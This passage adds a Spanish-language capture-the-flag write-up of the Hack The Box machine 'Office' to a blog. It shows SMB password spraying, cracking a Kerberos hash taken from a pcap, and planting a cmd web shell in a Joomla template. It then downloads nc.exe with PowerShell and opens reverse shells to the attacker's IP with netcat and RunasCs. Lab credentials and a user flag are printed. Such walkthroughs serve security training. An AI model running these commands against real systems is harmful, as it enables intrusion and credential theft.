+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb office.htb <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'H0lOgrams4reTakIng0Ver754!'</span> <span class="nt">--continue-on-success</span>
+SMB         office.htb      445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:office.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         office.htb      445    DC               <span class="o">[</span>-] office.htb<span class="se">\a</span>dministrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         office.htb      445    DC               <span class="o">[</span>-] office.htb<span class="se">\e</span>white:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         office.htb      445    DC               <span class="o">[</span>-] office.htb<span class="se">\e</span>tower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         office.htb      445    DC               <span class="o">[</span>+] office.htb<span class="se">\d</span>wolfe:H0lOgrams4reTakIng0Ver754!
+SMB         office.htb      445    DC               <span class="o">[</span>-] office.htb<span class="se">\d</span>lanor:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         office.htb      445    DC               <span class="o">[</span>-] office.htb<span class="se">\d</span>michael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+</code></pre></div></div>
+
+<ul>
+  <li>Como tenemos credenciales ahora si podemos enumerar por el protocolo <code class="language-plaintext highlighter-rouge">SMB</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb office.htb <span class="nt">-u</span> <span class="s1">'dwolfe'</span> <span class="nt">-p</span> <span class="s1">'H0lOgrams4reTakIng0Ver754!'</span> <span class="nt">--shares</span>
+SMB         office.htb      445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:office.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         office.htb      445    DC               <span class="o">[</span>+] office.htb<span class="se">\d</span>wolfe:H0lOgrams4reTakIng0Ver754!
+SMB         office.htb      445    DC               <span class="o">[</span>+] Enumerated shares
+SMB         office.htb      445    DC               Share           Permissions     Remark
+SMB         office.htb      445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         office.htb      445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         office.htb      445    DC               C<span class="nv">$ </span>                             Default share
+SMB         office.htb      445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         office.htb      445    DC               NETLOGON        READ            Logon server share
+SMB         office.htb      445    DC               SOC Analysis    READ
+SMB         office.htb      445    DC               SYSVOL          READ            Logon server share
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Hay un recurso interesante que se llama <code class="language-plaintext highlighter-rouge">SOC Analysis</code> vamos a conectarnos para examinar.</p>
+  </li>
+  <li>
+    <p>Y bueno vemos un <code class="language-plaintext highlighter-rouge">.pcap</code> vamos a descargarlo para ver que contiene.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-smbclient <span class="s1">'office.htb/dwolfe:H0lOgrams4reTakIng0Ver754!@office.htb'</span>
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Type <span class="nb">help </span><span class="k">for </span>list of commands
+<span class="c"># shares</span>
+ADMIN<span class="err">$</span>
+C<span class="err">$</span>
+IPC<span class="err">$</span>
+NETLOGON
+SOC Analysis
+SYSVOL
+<span class="c"># use SOC Analysis</span>
+<span class="c"># ls</span>
+drw-rw-rw-          0  Wed May 10 12:52:24 2023 <span class="nb">.</span>
+drw-rw-rw-          0  Wed Feb 14 04:18:31 2024 ..
+<span class="nt">-rw-rw-rw-</span>    1372860  Wed May 10 12:51:42 2023 Latest-System-Dump-8fbc124d.pcap
+<span class="c"># get Latest-System-Dump-8fbc124d.pcap</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a examinarlo con <code class="language-plaintext highlighter-rouge">Wireshark</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wireshark <span class="nt">-r</span> Latest-System-Dump-8fbc124d.pcap &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
+<span class="o">[</span>1] 19927
+</code></pre></div></div>
+
+<ul>
+  <li>Bueno hay demasiados paquetes.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/office/4.png" />
+</p>
+
+<ul>
+  <li>Como estamos ante un Domain Controller y filtramos por kerberos encontramos 2 peticiones y examinando una encontramos lo que parece ser un hash.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/office/5.png" />
+</p>
+
+<ul>
+  <li>Vemos que el hash pertenece al usuario tstark.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/office/6.png" />
+</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Hashcat</code> nos comparte la forma correcta en la cual el hash debería estar para poder crackearlo <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$krb5pa$18$tstark$OFFICE</span>.HTB<span class="nv">$a16f4806da05760af63c566d566f071c5bb35d0a414459417613</span>
+a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Ahora usando el Hash Mode que corresponde a Kerberos podemos crackearlo.</p>
+  </li>
+  <li>
+    <p>Tenemos la contraseña.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ hashcat <span class="nt">-m</span> 19900 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting
+
+OpenCL API <span class="o">(</span>OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG<span class="o">)</span> - Platform <span class="c">#1 [The pocl project]</span>
+<span class="o">==================================================================================================================================================</span>
+<span class="k">*</span> Device <span class="c">#1: cpu-skylake-avx512-Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz, 1426/2916 MB (512 MB allocatable), 2MCU</span>
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests<span class="p">;</span> 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+<span class="k">*</span> Zero-Byte
+<span class="k">*</span> Not-Iterated
+<span class="k">*</span> Single-Hash
+<span class="k">*</span> Single-Salt
+<span class="k">*</span> Slow-Hash-SIMD-LOOP
+
+Watchdog: Temperature abort trigger <span class="nb">set </span>to 90c
+
+Host memory required <span class="k">for </span>this attack: 0 MB
+
+Dictionary cache hit:
+<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
+<span class="k">*</span> Passwords.: 14344385
+<span class="k">*</span> Bytes.....: 139921507
+<span class="k">*</span> Keyspace..: 14344385
+
+<span class="nv">$krb5pa$18$tstark$OFFICE</span>.HTB<span class="nv">$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc</span>:playboy69
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 19900 <span class="o">(</span>Kerberos 5, etype 18, Pre-Auth<span class="o">)</span>
+Hash.Target......: <span class="nv">$krb5pa$18$tstark$OFFICE</span>.HTB<span class="nv">$a16f4806da05760af63c56</span>...86f5fc
+Time.Started.....: Thu Jul 18 18:51:55 2024 <span class="o">(</span>2 secs<span class="o">)</span>
+Time.Estimated...: Thu Jul 18 18:51:57 2024 <span class="o">(</span>0 secs<span class="o">)</span>
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
+Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+Speed.#1.........:     5459 H/s <span class="o">(</span>11.00ms<span class="o">)</span> @ Accel:256 Loops:512 Thr:1 Vec:16
+Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
+Progress.........: 5120/14344385 <span class="o">(</span>0.04%<span class="o">)</span>
+Rejected.........: 0/5120 <span class="o">(</span>0.00%<span class="o">)</span>
+Restore.Point....: 4608/14344385 <span class="o">(</span>0.03%<span class="o">)</span>
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3584-4095
+Candidate.Engine.: Device Generator
+Candidates.#1....: Liverpool -&gt; babygrl
+Hardware.Mon.#1..: Util: 99%
+
+Started: Thu Jul 18 18:51:17 2024
+Stopped: Thu Jul 18 18:51:58 2024
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos credenciales nuevas <code class="language-plaintext highlighter-rouge">tstark:playboy69</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb office.htb <span class="nt">-u</span> <span class="s1">'tstark'</span> <span class="nt">-p</span> <span class="s1">'playboy69'</span>
+SMB         office.htb      445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:office.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         office.htb      445    DC               <span class="o">[</span>+] office.htb<span class="se">\t</span>stark:playboy69
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora si nos podemos conectar al Joomla.</li>
+</ul>
+
+<blockquote>
+  <p>Las credenciales con ese usuario no funcionan pero como el único usuario que vemos es Tony Stark podemos suponer que el es el usuario administrador del sitio así que si vamos al panel de login y usamos las siguientes credenciales podemos conectarnos <code class="language-plaintext highlighter-rouge">administrator:playboy69</code>.</p>
+</blockquote>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/office/7.png" />
+</p>
+
+<blockquote>
+  <p>Hay un Template que se llama Cassiopeia el cual podemos ver que ejecuta PHP, System –&gt; Site Templates –&gt; Cassiopeia Details and Files vamos a editar el archivo error.php para poder obtener ejecución remota de comandos ya que podemos hacerlo por que estamos como el usuario Administrador.</p>
+</blockquote>
+
+<ul>
+  <li>Vamos a eliminar todo el contenido que tiene y a poner esta simple línea para que mediante el parámetro cmd poder hacer ejecución de comandos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/office/8.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Ahora le damos click a Save para guardar los cambios.</p>
+  </li>
+  <li>
+    <p>Funciona.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="s1">'http://office.htb/templates/cassiopeia/error.php?cmd=whoami'</span>
+office<span class="se">\w</span>eb_account
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora para ganar acceso vamos a subir el netcat a la maquina victima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
+❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora simplemente hacemos la petición para descargarlo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="s1">'http://office.htb/templates/cassiopeia/error.php?cmd=powershell+iwr+10.10.14.74:80/nc.exe+-O+nc.exe'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos ponemos en escucha.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<ul>
+  <li>Nos enviamos la reverse shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="s1">'http://office.htb/templates/cassiopeia/error.php?cmd=nc.exe+10.10.14.74+443+-e+cmd.exe'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Recibimos la shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvvp</span>  443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.74] from office.htb <span class="o">[</span>10.10.11.3] 58197
+Microsoft Windows <span class="o">[</span>Version 10.0.20348.2322]
+<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
+C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\j</span>oomla<span class="se">\t</span>emplates<span class="se">\c</span>assiopeia&gt;whoami
+<span class="nb">whoami
+</span>office<span class="se">\w</span>eb_account
+
+C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\j</span>oomla<span class="se">\t</span>emplates<span class="se">\c</span>assiopeia&gt;
+</code></pre></div></div>
+
+<h2 id="shell-as-tstark">Shell as tstark</h2>
+
+<ul>
+  <li>El usuario tstark esta usuario valido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\j</span>oomla<span class="se">\t</span>emplates<span class="se">\c</span>assiopeia&gt;net user
+net user
+
+User accounts <span class="k">for</span> <span class="se">\\</span>DC
+
+<span class="nt">-------------------------------------------------------------------------------</span>
+Administrator            dlanor                   dmichael
+dwolfe                   etower                   EWhite
+Guest                    HHogan                   krbtgt
+PPotts                   tstark                   web_account
+The <span class="nb">command </span>completed successfully.
+
+
+C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\j</span>oomla<span class="se">\t</span>emplates<span class="se">\c</span>assiopeia&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Como tenemos credenciales vamos a usar Runas <a href="https://github.com/antonioCoco/RunasCs/releases">https://github.com/antonioCoco/RunasCs/releases</a> para enviarnos una shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\j</span>oomla<span class="se">\t</span>emplates<span class="se">\c</span>assiopeia&gt;powershell iwr http://10.10.14.74/RunasCs.exe <span class="nt">-o</span> RunasCs.exe
+powershell iwr http://10.10.14.74/RunasCs.exe <span class="nt">-o</span> RunasCs.exe
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos ponemos en escucha.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvvp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+</code></pre></div></div>
+
+<ul>
+  <li>Nos enviamos la shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\j</span>oomla<span class="se">\t</span>emplates<span class="se">\c</span>assiopeia&gt;.<span class="se">\R</span>unasCs.exe tstark playboy69 cmd.exe <span class="nt">-r</span> 10.10.14.74:4444
+.<span class="se">\R</span>unasCs.exe tstark playboy69 cmd.exe <span class="nt">-r</span> 10.10.14.74:4444
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Warning: The logon <span class="k">for </span>user <span class="s1">'tstark'</span> is limited. Use the flag combination <span class="nt">--bypass-uac</span> and <span class="nt">--logon-type</span> <span class="s1">'8'</span> to obtain a more privileged token.
+
+<span class="o">[</span>+] Running <span class="k">in </span>session 0 with process <span class="k">function </span>CreateProcessWithLogonW<span class="o">()</span>
+<span class="o">[</span>+] Using Station<span class="se">\D</span>esktop: Service-0x0-a4110<span class="nv">$\</span>Default
+<span class="o">[</span>+] Async process <span class="s1">'C:\Windows\system32\cmd.exe'</span> with pid 6024 created <span class="k">in </span>background.
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora estamos como ese usuario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvvp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>10.10.14.74] from office.htb <span class="o">[</span>10.10.11.3] 58226
+Microsoft Windows <span class="o">[</span>Version 10.0.20348.2322]
+<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+<span class="nb">whoami
+</span>office<span class="se">\t</span>stark
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<h2 id="shell-as-ppotts">Shell as ppotts</h2>
+
+<ul>
+  <li>Bueno podemos ver la user flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type  C:<span class="se">\u</span>sers<span class="se">\t</span>stark<span class="se">\d</span>esktop<span class="se">\u</span>ser.txt
+<span class="nb">type  </span>C:<span class="se">\u</span>sers<span class="se">\t</span>stark<span class="se">\d</span>esktop<span class="se">\u</span>ser.txt
+7a8bcc49138ecf42c7a6202ab4129dd2
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que al parecer hay otro web.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal&gt;dir
+<span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is C626-9388
+
+ Directory of C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal
+
+01/30/2024  09:39 AM    &lt;DIR&gt;          <span class="nb">.</span>
+05/09/2023  07:53 AM    &lt;DIR&gt;          ..
+02/14/2024  06:35 PM    &lt;DIR&gt;          applications
+05/01/2023  04:27 PM    &lt;DIR&gt;          css
+05/01/2023  04:27 PM    &lt;DIR&gt;          img
+01/30/2024  09:38 AM             5,113 index.html
+01/30/2024  09:40 AM             5,282 resume.php
+               2 File<span class="o">(</span>s<span class="o">)</span>         10,395 bytes
+               5 Dir<span class="o">(</span>s<span class="o">)</span>   5,069,225,984 bytes free
+
+C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que nos hablan sobre una subida de archivos al parecer de un resume.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal&gt;type resume.php
+<span class="nb">type </span>resume.php
+&lt;?php
+<span class="nv">$notifi</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+<span class="k">if</span><span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s2">"REQUEST_METHOD"</span><span class="o">]</span> <span class="o">==</span> <span class="s2">"POST"</span> <span class="o">){</span>
+  <span class="nv">$stdname</span><span class="o">=</span>trim<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'fullname'</span><span class="o">])</span><span class="p">;</span>
+  <span class="nv">$email</span><span class="o">=</span>str_replace<span class="o">(</span><span class="s1">'.'</span>,<span class="s1">'-'</span>,<span class="nv">$_POST</span><span class="o">[</span><span class="s1">'email'</span><span class="o">])</span><span class="p">;</span>
+  <span class="nv">$experience</span><span class="o">=</span>trim<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'experience'</span><span class="o">])</span><span class="p">;</span>
+  <span class="nv">$salary</span><span class="o">=</span>trim<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'salary'</span><span class="o">])</span><span class="p">;</span>
+  <span class="nv">$department</span><span class="o">=</span>trim<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'department'</span><span class="o">])</span><span class="p">;</span>
+  <span class="nv">$rewritefn</span> <span class="o">=</span> strtolower<span class="o">(</span>str_replace<span class="o">(</span><span class="s1">' '</span>,<span class="s1">'-'</span>,<span class="s2">"</span><span class="nv">$stdname</span><span class="s2">-</span><span class="nv">$department</span><span class="s2">-</span><span class="nv">$salary</span><span class="s2"> </span><span class="nv">$experience</span><span class="s2"> </span><span class="nv">$email</span><span class="s2">"</span><span class="o">))</span><span class="p">;</span>
+
+  <span class="nv">$filename</span> <span class="o">=</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'assignment'</span><span class="o">][</span><span class="s1">'name'</span><span class="o">]</span><span class="p">;</span>
+  <span class="nv">$filetype</span><span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'assignment'</span><span class="o">][</span><span class="s1">'type'</span><span class="o">]</span><span class="p">;</span>
+  <span class="nv">$filesize</span> <span class="o">=</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'assignment'</span><span class="o">][</span><span class="s1">'size'</span><span class="o">]</span><span class="p">;</span>
+  <span class="nv">$fileerr</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'assignment'</span><span class="o">][</span><span class="s1">'error'</span><span class="o">]</span><span class="p">;</span>
+  <span class="nv">$filetmp</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'assignment'</span><span class="o">][</span><span class="s1">'tmp_name'</span><span class="o">]</span><span class="p">;</span>
+  <span class="nb">chmod</span><span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'assignment'</span><span class="o">][</span><span class="s1">'tmp_name'</span><span class="o">]</span>, 0664<span class="o">)</span><span class="p">;</span>
+  // onigiri <span class="k">in</span> <span class="nb">.</span>
+ <span class="nv">$ext</span> <span class="o">=</span> explode<span class="o">(</span><span class="s1">'.'</span>,<span class="nv">$filename</span><span class="o">)</span><span class="p">;</span>
+  //last piece of data from array
+ <span class="nv">$extension</span> <span class="o">=</span> strtolower<span class="o">(</span>end<span class="o">(</span><span class="nv">$ext</span><span class="o">))</span><span class="p">;</span>
+  <span class="nv">$filesallowed</span> <span class="o">=</span> array<span class="o">(</span><span class="s1">'docm'</span>,<span class="s1">'docx'</span>,<span class="s1">'doc'</span>,<span class="s1">'odt'</span><span class="o">)</span><span class="p">;</span>
+   <span class="k">if</span><span class="o">(</span>in_array<span class="o">(</span><span class="nv">$extension</span>,<span class="nv">$filesallowed</span><span class="o">)){</span>
+     <span class="k">if</span> <span class="o">(</span><span class="nv">$fileerr</span> <span class="o">===</span> 0<span class="o">){</span>
+       <span class="k">if</span> <span class="o">(</span><span class="nv">$filesize</span> &lt; 5242880<span class="o">){</span>
+	 <span class="nv">$ff</span> <span class="o">=</span> <span class="s2">"</span><span class="nv">$rewritefn</span><span class="s2">.</span><span class="nv">$extension</span><span class="s2">"</span><span class="p">;</span>
+	 <span class="nv">$loc</span> <span class="o">=</span> <span class="s2">"applications/"</span>.<span class="nv">$ff</span><span class="p">;</span>
+	   <span class="k">if</span><span class="o">(</span>move_uploaded_file<span class="o">(</span><span class="nv">$filetmp</span>,<span class="nv">$loc</span><span class="o">))</span>
+	   <span class="o">{</span>
+	     // upload successful
+	     <span class="nv">$notifi</span><span class="o">=</span><span class="s2">"&lt;span class=notifi&gt;✔ Upload Successful!&lt;/span&gt;&lt;hr/&gt;&lt;style&gt;
+	       button, input , select, option, h3{
+			display:none;
+		}
+	       &lt;/style&gt;"</span><span class="p">;</span>
+	 <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+<span class="nb">echo</span> <span class="nv">$loc</span><span class="p">;</span>
+	 <span class="nv">$notifi</span><span class="o">=</span><span class="s2">"&lt;span class=notifi&gt;✖️  Something Went Wrong! Unable To upload the Resume!&lt;/span&gt;&lt;hr/&gt;"</span><span class="p">;</span>
+	 <span class="o">}</span>
+
+       <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+	
+	 <span class="nv">$notifi</span><span class="o">=</span><span class="s2">"&lt;span class=notifi&gt;⚠️  Your Resume should be less than 5MB!&lt;/span&gt;&lt;hr/&gt;"</span><span class="p">;</span>
+       <span class="o">}</span>
+
+     <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+   <span class="nv">$notifi</span><span class="o">=</span><span class="s2">"&lt;span class=notifi&gt;✖️  Corrupted File/Unable to Upload!&lt;/span&gt;&lt;hr/&gt;"</span><span class="p">;</span>
+     <span class="o">}</span>
+
+   <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+   <span class="nv">$notifi</span><span class="o">=</span><span class="s2">"&lt;span class=notifi&gt;❌ Accepted File Types : Doc, Docx, Docm, Odt!&lt;/span&gt;&lt;hr/&gt;"</span><span class="p">;</span>
+   <span class="o">}</span>
+<span class="o">}</span>
+?&gt;
+&lt;<span class="o">!</span>DOCTYPE html&gt;
+&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
+&lt;<span class="nb">head</span><span class="o">&gt;</span>
+  &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>
+	&lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"shortcut icon"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"https://www.pinclipart.com/picdir/big/344-3445944_png-file-svg-terminal-icon-png-clipart.png"</span><span class="o">&gt;</span>
+  &lt;title&gt;Resume Submission&lt;/title&gt;
+  &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1.0"</span><span class="o">&gt;</span>
+&lt;style <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="o">&gt;</span>
+body<span class="o">{</span>
+height:100%<span class="p">;</span>
+overflow:auto<span class="p">;</span>
+<span class="o">}</span>
+.notifi<span class="o">{</span>
+font-weight:bold<span class="p">;</span>
+padding:0px<span class="p">;</span>
+<span class="o">}</span>
+.notifi hr<span class="o">{</span>
+background:#000000<span class="p">;</span>
+height:2px<span class="p">;</span>
+<span class="o">}</span>
+.magic<span class="o">{</span>
+margin-top:0.5%<span class="p">;</span>
+max-height:90%<span class="p">;</span>
+max-width:90%<span class="p">;</span>
+border: 2px solid <span class="c">#000000;</span>
+<span class="o">}</span>
+.inpstylef<span class="o">{</span>
+border-bottom: 2px solid <span class="c">#000000;</span>
+padding:0.5%<span class="p">;</span>
+font-size:14px<span class="p">;</span>
+font-weight:bold<span class="p">;</span>
+<span class="o">}</span>
+.inputstyle ,.inpstyles <span class="o">{</span>
+width:69%<span class="p">;</span>
+height:35px<span class="p">;</span>
+border:2px solid <span class="c">#000000;</span>
+<span class="o">}</span>
+.inpstylef::-webkit-file-upload-button <span class="o">{</span>
+  visibility: hidden<span class="p">;</span>
+<span class="o">}</span>
+.inpstylef::before <span class="o">{</span>
+  content: <span class="s1">'  '</span><span class="p">;</span>
+  display: inline-block<span class="p">;</span>
+  border: 1px solid <span class="c">#999;</span>
+  border-radius: 3px<span class="p">;</span>
+  padding: 5px 8px<span class="p">;</span>
+  outline: none<span class="p">;</span>
+  white-space: nowrap<span class="p">;</span>
+  <span class="nt">-webkit-user-select</span>: none<span class="p">;</span>
+  cursor: pointer<span class="p">;</span>
+  text-shadow: 1px 1px <span class="c">#fff;</span>
+  font-weight: 700<span class="p">;</span>
+  font-size: 10pt<span class="p">;</span>
+<span class="o">}</span>
+::placeholder<span class="o">{</span>
+color:#151715<span class="p">;</span>
+opacity:1<span class="p">;</span>
+font-weight:bold<span class="p">;</span>
+<span class="o">}</span>
+.magic h3<span class="o">{</span>
+    text-align: left<span class="p">;</span>
+    padding-left: 260px<span class="p">;</span>
+
+<span class="o">}</span>
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;center&gt;
+    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"magic"</span><span class="o">&gt;</span>
+      &lt;h1&gt; Job Application Submission&lt;/h1&gt;
+	&lt;hr <span class="nv">style</span><span class="o">=</span><span class="s2">"width:inherit;padding:0px;height:2px; background:#000000"</span>/&gt;
+	&lt;span <span class="nv">class</span><span class="o">=</span><span class="s2">"notifi"</span><span class="o">&gt;</span>&lt;?php <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$notifi</span><span class="s2">"</span><span class="p">;</span> ?&gt;&lt;/span&gt;
